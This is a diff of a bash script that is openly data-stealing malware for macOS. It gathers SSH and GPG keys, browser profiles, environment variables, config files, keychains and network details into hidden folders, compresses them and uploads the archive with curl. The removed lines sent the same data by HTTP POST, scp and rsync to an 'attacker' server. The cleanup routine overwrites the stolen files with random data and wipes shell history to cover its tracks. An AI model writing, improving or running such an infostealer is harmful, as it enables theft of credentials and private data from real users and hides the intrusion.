@@ -1,18 +1,18 @@
 #!/bin/bash
 
 hidden_dir="$HOME/.sys"
-hidden_file=".l.oo.t.zip"
+hidden_file=".l.oo.t.tgz"
 stor_dir="$HOME/.s"
+ssh_private_key="$HOME/.sys/.s"
+remote_ssh_user="ubuntu"
+remote_path="/tmp"
+
 
 # Remote server configuration
-http_server="192.168.1.100"
-http_port="8080"
-scp_server="192.168.1.100"
+https_server="localhost"
+https_port="8080"
+scp_server="localhost"
 scp_port="2222"
-rsync_server="192.168.1.100"
-rsync_port="873"
-remote_user="attacker"
-remote_path="/home/attacker/uploads"
 
 
 if [ ! -d "$hidden_dir" ] ; then
@@ -22,6 +22,16 @@ fi
 if [ ! -d "$stor_dir" ] ; then
    mkdir -p "$stor_dir"
 fi
+
+check_ssh_endpoint() {
+  # Check SSH server (for both SCP and Rsync)
+  ssh -q -p $scp_port -o ConnectTimeout=1 "$remote_ssh_user@$scp_server" &> /dev/null
+  if [ $? -ne 0 ]; then
+    exit 1
+  else 
+    return 0
+  fi 
+}
 
 exfil_files() {
   mkdir -p "$hidden_dir/files"
@@ -60,6 +70,8 @@ exfil_browsers() {
   cp -r "$HOME/Library/Application Support/Google/Chrome" "$hidden_dir/browsers/" &>/dev/null
   cp -r "$HOME/Library/Application Support/BraveSoftware/Brave-Browser" "$hidden_dir/browsers/" &>/dev/null
   cp -r "$HOME/Library/Application Support/Firefox" "$hidden_dir/browsers/" &>/dev/null
+  cp -r "$HOME/Library/Safari" "$hidden_dir/browsers/Safari/" &>/dev/null
+
 
   exfil_browser_pid=$!
   
@@ -67,11 +79,13 @@ exfil_browsers() {
 
 network_details() {
   mkdir -p "$hidden_dir/network"
-  networksetup -getinfo Wi-Fi >> "$hidden_dir/network/wifi_ip.txt"
+  networksetup -getinfo Wi-Fi >> "$hidden_dir/network/wifi_ip.txt" &> /dev/null
+  netstat -an | grep ESTABLISHED >> "$hidden_dir/network/active_connections.txt"
   ifconfig >> "$hidden_dir/network/ifconfig.txt"
   arp -a >> "$hidden_dir/network/arp.txt"
-  networksetup -listpreferredwirelessnetworks en0 | awk 'NR>1 {print $1}' >> "$hidden_dir/network/saved_wifi_ssid.txt"
-  lsof -Pn -i4 | grep LISTEN >> $hidden_dir/network/listening_ports.txt
+  networksetup -listpreferredwirelessnetworks en0 | awk 'NR>1 {print $1}' >> "$hidden_dir/network/saved_wifi_ssid.txt" &> /dev/null
+
+  lsof -Pn -i4 | grep LISTEN >> $hidden_dir/network/listening_ports.txt &> /dev/null
 
   for ext_net in ip city region country loc org postal timezone; do
     echo " $ext_net - $(curl -s https://ipinfo.io/$ext_net)" >> "$hidden_dir/network/external_net"
@@ -84,6 +98,7 @@ exfil_bt() {
 
 exfil_keys() {
   mkdir -p "$hidden_dir/keys"
+  ssh-add -L >> $hidden_dir/keys/active_ssh_keys.txt
   cp -r ~/.ssh  $hidden_dir/keys/ &> /dev/null
   cp -r ~/.gnupg $hidden_dir/keys/ &> /dev/null
 }
@@ -93,7 +108,8 @@ exfil_fs() {
 }
 
 exfil_apps() {
-  ls /Applications
+  mkdir -p $hidden_dir/apps
+  system_profiler SPApplicationsDataType $hidden_dir/apps/installed_apps.txt
 }
 
 exfil_config() {
@@ -108,6 +124,8 @@ exfil_config() {
                  "*.kube*"
                )
 
+  printenv >> "$hidden_dir/configs/env_variables.txt"
+
   for files in "$HOME/${config_files[@]}"; do
     cp -r $HOME/$files "$hidden_dir/configs/" &> /dev/null
   done
@@ -116,30 +134,35 @@ exfil_config() {
 exfil_compress() {
   mkdir -p "$stor_dir"
   cd "$stor_dir"
-  zip -5 -r "$stor_dir/$hidden_file" "$hidden_dir" 2>/dev/null &> /dev/null
+  nohup tar czf  "$stor_dir/$hidden_file" "$hidden_dir" &> /dev/null
+
+  if [ $? -ne 0 ]; then
+    cleanup
+    exit 1
+  fi
 
   compress_pid=$!
 }
 
 exfiltrate() {
-
-  # add ssh key logic
-
-  # HTTP POST Upload
-  curl -X POST -F "file=@$stor_dir/$hidden_file" "http://$http_server:$http_port/upload" &> /dev/null
-
-  # SCP Upload
-  scp -P $scp_port "$stor_dir/$hidden_file" "$remote_user@$scp_server:$remote_path" &> /dev/null
-
-  # Rsync Upload
-  rsync -az --port=$rsync_port "$stor_dir/$hidden_file" "$remote_user@$rsync_server:$remote_path" &> /dev/null
-
-  exfiltrate_pid=$!
+  nohup curl --upload-file "$stor_dir/$hidden_file" https://$https_server:$https_port/upload --insecure &> /dev/null &
+  if [ $? -ne 0 ]; then
+    cleanup
+    exit 1
+  fi
 }
 
 cleanup() {
-  rm -rf "$hidden_dir"
-  rm -rf "$stor_dir"
+  # Overwrite files before deletion
+  if [ -d "$hidden_dir" ]; then
+    find "$hidden_dir" -type f -exec bash -c 'for i in {1..3}; do dd if=/dev/urandom of="{}" bs=1M count=1 &> /dev/null; done' \;
+    rm -rf "$hidden_dir"
+  fi
+
+  if [ -d "$stor_dir" ]; then
+    find "$stor_dir" -type f -exec bash -c 'for i in {1..3}; do dd if=/dev/urandom of="{}" bs=1M count=1 &> /dev/null; done' \;
+    rm -rf "$stor_dir"
+  fi
   echo > ~/.zsh_history
   history -c 
 }
@@ -157,8 +180,8 @@ exfil_keychains
 wait $exfil_files_pid $exfil_cloud_pid $exfil_browsers_pid
 exfil_compress & 
 
-#wait $compress_pid
+
 # exfiltrate &
 
-#wait exfiltrate
-#cleanup
+#wait exfiltrate_pid
+# cleanup &
